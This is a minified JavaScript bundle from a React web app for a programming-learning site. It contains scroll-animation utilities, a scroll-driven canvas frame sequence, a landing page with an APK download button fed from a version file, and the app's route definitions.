_oe(a,e,t,n={}){return{measure:i=>{Noe(a,n.target,t),Poe(a,t,i),(n.offset||n.target)&&Moe(a,t,n)},notify:()=>e(t)}}const rc=new WeakMap,GR=new WeakMap,Uy=new WeakMap,QR=new WeakMap,Df=new WeakMap,JR=a=>a===document.scrollingElement?window:a;function fq(a,{container:e=document.scrollingElement,trackContentSize:t=!1,...n}={}){if(!e)return gn;let i=Uy.get(e);i||(i=new Set,Uy.set(e,i));const r=xoe(),l=_oe(e,a,r,n);if(i.add(l),!rc.has(e)){const d=()=>{for(const E of i)E.measure(Lt.timestamp);va.preUpdate(p)},p=()=>{for(const E of i)E.notify()},f=()=>va.read(d);rc.set(e,f);const h=JR(e);window.addEventListener("resize",f),e!==document.documentElement&&GR.set(e,iE(e,f)),h.addEventListener("scroll",f),f()}if(t&&!Df.has(e)){const d=rc.get(e),p={width:e.scrollWidth,height:e.scrollHeight};QR.set(e,p);const f=()=>{const E=e.scrollWidth,C=e.scrollHeight;(p.width!==E||p.height!==C)&&(d(),p.width=E,p.height=C)},h=va.read(f,!0);Df.set(e,h)}const u=rc.get(e);return va.read(u,!1,!0),()=>{ei(u);const d=Uy.get(e);if(!d||(d.delete(l),d.size))return;const p=rc.get(e);rc.delete(e),p&&(JR(e).removeEventListener("scroll",p),GR.get(e)?.(),window.removeEventListener("resize",p));const f=Df.get(e);f&&(ei(f),Df.delete(e)),QR.delete(e)}}function hq(a){return typeof window<"u"&&!a&&o_()}const WR=new Map;function qoe(a){const e={value:0},t=fq(n=>{e.value=n[a.axis].progress*100},a);return{currentTime:e,cancel:t}}function gq({source:a,container:e,...t}){const{axis:n}=t;a&&(e=a);const i=WR.get(e)??new Map;WR.set(e,i);const r=t.target??"self",l=i.get(r)??{},u=n+(t.offset??[]).join(",");return l[u]||(l[u]=hq(t.target)?new ScrollTimeline({source:e,axis:n}):qoe({container:e,...t})),l[u]}function koe(a,e){const t=gq(e);return a.attachTimeline({timeline:e.target?void 0:t,observe:n=>(n.pause(),I_(i=>{n.time=n.iterationDuration*i},t))})}function Ooe(a){return a.length===2}function Uoe(a,e){return Ooe(a)?fq(t=>{a(t[e.axis].progress,t)},e):I_(a,gq(e))}function bq(a,{axis:e="y",container:t=document.scrollingElement,...n}={}){if(!t)return gn;const i={axis:e,container:t,...n};return typeof a=="function"?Uoe(a,i):koe(a,i)}const zoe=()=>({scrollX:yi(0),scrollY:yi(0),scrollXProgress:yi(0),scrollYProgress:yi(0)}),Mf=a=>a?!a.current:!1;function KR(a,e,t){return{factory:n=>bq(n,{...e,axis:a,container:t}),times:[0,1],keyframes:[0,1],ease:n=>n,duration:1}}function Boe({container:a,target:e,...t}={}){const n=Ag(zoe);if(!e&&hq()){const u=a?.current||void 0;n.scrollXProgress.accelerate=KR("x",t,u),n.scrollYProgress.accelerate=KR("y",t,u)}const i=U.useRef(null),r=U.useRef(!1),l=U.useCallback(()=>(i.current=bq((u,{x:d,y:p})=>{n.scrollX.set(d.current),n.scrollXProgress.set(d.progress),n.scrollY.set(p.current),n.scrollYProgress.set(p.progress)},{...t,container:a?.current||void 0,target:e?.current||void 0}),()=>{i.current?.()}),[a,e,JSON.stringify(t.offset)]);return nS(()=>{if(r.current=!1,Mf(a)||Mf(e)){r.current=!0;return}else return l()},[l]),U.useEffect(()=>{if(r.current)return pp(!Mf(a)),pp(!Mf(e)),l()},[l]),n}function vq(a){const e=Ag(()=>yi(a)),{isStatic:t}=U.useContext(Ig);if(t){const[,n]=U.useState(a);U.useEffect(()=>e.on("change",n),[])}return e}function yq(a,e){const t=vq(e()),n=()=>t.set(e());return n(),nS(()=>{const i=()=>va.preRender(n,!1,!0),r=a.map(l=>l.on("change",i));return()=>{r.forEach(l=>l()),ei(n)}}),t}function Foe(a){Qd.current=[],a();const e=yq(Qd.current,a);return Qd.current=void 0,e}function Voe(a,e,t,n){if(typeof a=="function")return Foe(a);const r=$te(e,t,n),l=Array.isArray(a)?YR(a,r):YR([a],([d])=>r(d)),u=Array.isArray(a)?void 0:a.accelerate;return u&&!u.isTransformed&&typeof e!="function"&&Array.isArray(t)&&n?.clamp!==!1&&(l.accelerate={...u,times:e,keyframes:t,isTransformed:!0}),l}function YR(a,e){const t=Ag(()=>[]);return yq(a,()=>{t.length=0;const n=a.length;for(let i=0;i<n;i++)t[i]=a[i].get();return e(t)})}function Hoe(a,e={}){const{isStatic:t}=U.useContext(Ig),n=()=>wt(a)?a.get():a;if(t)return Voe(n);const i=vq(n());return U.useInsertionEffect(()=>Xte(i,a,e),[i,JSON.stringify(e)]),i}function Goe(a,e={}){return Hoe(a,{type:"spring",...e})}const Qoe=({basePath:a,imagePrefix:e,imageSuffix:t=".jpg",frameCount:n,height:i="300vh",children:r})=>{const l=U.useRef(null),u=U.useRef(null),[d,p]=U.useState([]),[f,h]=U.useState(!1),[E,C]=U.useState({success:0,fail:0}),[A,j]=U.useState(!1),[R,I]=U.useState(!1),w=U.useRef(-1),{scrollYProgress:k}=Boe({target:l,offset:["start start","end end"]});Coe(k,"change",L=>{L<=0?(j(!1),I(!1)):L>=1?(j(!1),I(!0)):(j(!0),I(!1))});const Y=Goe(k,{stiffness:400,damping:40,restDelta:1e-4});U.useEffect(()=>{let L=!0,_=0,V=0;const F=[],ce=()=>{_+V===n&&h(!0)};for(let me=1;me<=n;me++){const Z=new Image,re=me.toString().padStart(3,"0");Z.src=`${a}${e}${re}${t}`,Z.onload=()=>{L&&(_++,C({success:_,fail:V}),ce())},Z.onerror=()=>{L&&(V++,C({success:_,fail:V}),ce())},F.push(Z)}return p(F),()=>{L=!1}},[a,e,n,t]),U.useEffect(()=>{const L=u.current;if(!L)return;const _=L.getContext("2d",{alpha:!1});if(!_||d.length===0)return;let V;const F=()=>{const ce=Y.get();let me=Math.floor(ce*(n-1));me=Math.min(n-1,Math.max(0,me));let Z=!1;const re=window.devicePixelRatio||1,Ee=window.innerWidth,je=window.innerHeight;if((L.width!==Ee*re||L.height!==je*re)&&(L.width=Ee*re,L.height=je*re,L.style.width=`${Ee}px`,L.style.height=`${je}px`,_.scale(re,re),Z=!0),me!==w.current||Z){const G=d[me];if(G&&G.complete&&G.naturalWidth!==0){_.clearRect(0,0,Ee,je);const J=Math.max(Ee/G.width,je/G.height),de=Ee/2-G.width/2*J,B=je/2-G.height/2*J;_.drawImage(G,de,B,G.width*J,G.height*J),w.current=me}}V=requestAnimationFrame(F)};return V=requestAnimationFrame(F),()=>cancelAnimationFrame(V)},[Y,d,n]);const ee=E.success+E.fail,Q=Math.round(ee/n*100),[q,M]=U.useState(typeof window<"u"?window.innerHeight:0);U.useEffect(()=>{const L=()=>M(window.innerHeight);return window.addEventListener("resize",L),()=>window.removeEventListener("resize",L)},[]);const N=()=>{const L={left:0,width:"100%",height:q>0?`${q}px`:"100vh",zIndex:0,overflow:"hidden",pointerEvents:"none"};return R?{...L,position:"absolute",bottom:0}:A?{...L,position:"fixed",top:0}:{...L,position:"absolute",top:0}};return b.jsxs("div",{ref:l,style:{height:i,position:"relative"},className:"w-full bg-black",children:[b.jsxs("div",{style:N(),children:[!f&&b.jsxs("div",{className:"absolute inset-0 flex flex-col items-center justify-center z-50 bg-black text-emerald-500 font-mono",children:[b.jsx("div",{className:"text-[10px] tracking-[0.5em] mb-4 opacity-50 uppercase",children:"Neural Stream"}),b.jsxs("div",{className:"text-3xl font-black",children:[Q,"%"]}),b.jsx("div",{className:"w-48 h-[1px] bg-emerald-900/30 mt-6 relative overflow-hidden",children:b.jsx("div",{className:"absolute top-0 left-0 h-full bg-emerald-500",style:{width:`${Q}%`}})})]}),b.jsx("canvas",{ref:u,className:"w-full h-full block object-cover",style:{opacity:f?1:0,transition:"opacity 1s ease",filter:"brightness(1.1) contrast(1.1) saturate(1.1)"}})]}),b.jsx("div",{className:"relative w-full z-[100] pointer-events-none",children:r})]})},Joe=()=>{const[a,e]=U.useState(null),[t,n]=U.useState(typeof window<"u"&&window.innerWidth<768?34:84);return U.useEffect(()=>{fetch("https://raw.githubusercontent.com/Owning01/progra-public-releases/main/version.json").then(r=>r.json()).then(r=>{r.apk_url&&e(r.apk_url)}).catch(r=>console.error("Error checking updates:",r));const i=()=>{n(window.innerWidth<768?34:84)};return window.addEventListener("resize",i),()=>window.removeEventListener("resize",i)},[]),b.jsx("div",{className:"inicio-minimal bg-black",children:b.jsxs(Qoe,{basePath:"/assets/sequence/",imagePrefix:"frame_",imageSuffix:".jpg",frameCount:t,height:"600vh",children:[b.jsxs("div",{className:"absolute top-0 left-0 w-full h-[40vh] md:h-[45vh] lg:h-[35vh] flex flex-col items-center justify-center p-4 md:p-10 lg:p-20 pointer-events-none z-10",children:[b.jsxs("h1",{className:"text-4xl sm:text-5xl md:text-7xl lg:text-8xl font-black text-white tracking-tighter uppercase text-center bg-black/50 backdrop-blur-md p-6 md:p-10 lg:px-16 rounded-3xl md:rounded-[2.5rem] border border-white/10 shadow-2xl transition-transform",children:["Programa ya! ",b.jsx("br",{}),b.jsx("span",{className:"text-emerald-500 text-[10px] sm:text-xs md:text-lg lg:text-2xl tracking-[0.3em] md:tracking-[0.6em] font-light block mt-2 md:mt-4 opacity-100 uppercase",children:"ENGINEERING EXCELLENCE"})]}),a&&b.jsx(Soe.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:1},className:"download-section mt-8 pointer-events-auto",children:b.jsxs("a",{href:a,className:"btn-download-apk",target:"_blank",rel:"noopener noreferrer",children:[b.jsx(ND,{className:"android-icon"})," INSTALAR APK"]})})]}),b.jsx("div",{className:"absolute top-0 left-0 w-full h-full pointer-events-none overflow-visible"}),b.jsx("div",{className:"w-full h-screen pointer-events-none"})]})})},Woe=()=>b.jsx(EV,{children:b.jsx(c7,{children:b.jsxs(YF,{children:[b.jsx($t,{path:"/",element:b.jsx(m7,{})}),b.jsx($t,{path:"/dashboard",element:b.jsx(No,{children:b.jsx(f7,{})})}),b.jsx($t,{path:"/admin",element:b.jsx(aee,{children:b.jsx(eee,{})})}),b.jsx($t,{path:"/roadmap",element:b.jsx(No,{children:b.jsx(h7,{})})}),b.jsx($t,{path:"/projects",element:b.jsx(No,{children:b.jsx(ZZ,{})})}),b.jsx($t,{path:"/profile",element:b.jsx(No,{children:b.jsx(tee,{})})}),b.jsx($t,{path:"/cheatsheets",element:b.jsx(No,{children:b.jsx(Pee,{})})}),b.jsx($t,{path:"/libraries",element:b.jsx(No,{children:b.jsx(Iee,{})})}),b.jsx($t,{path:"/div-playground",element:b.jsx(No,{children:b.jsx(Dee,{})})}),b.jsx($t,{path:"/career-advice",element:b.jsx(No,{children:b.jsx(Mee,{})})}),b.jsx($t,{path:"/learn/:moduleId",element:b.jsx(No,{children:b.jsx(WZ,{})})}),b.jsx($t,{path:"/inicio2",element:b.jsx(Joe,{})}),b.jsx($t,{path:"/login",element:b.jsx(KZ,{})}),b.jsx($t,{path:"/register",element:b.jsx(YZ,{})})]})})});function Koe(){return b.jsx(Woe,{})}o3.createRoot(document.getElementById("root")).render(b.jsx(U.StrictMode,{children:b.jsx(Q8,{children:b.jsx(W8,{children:b.jsx(J8,{children:b.jsx(X8,{children:b.jsx(Koe,{})})})})})}));
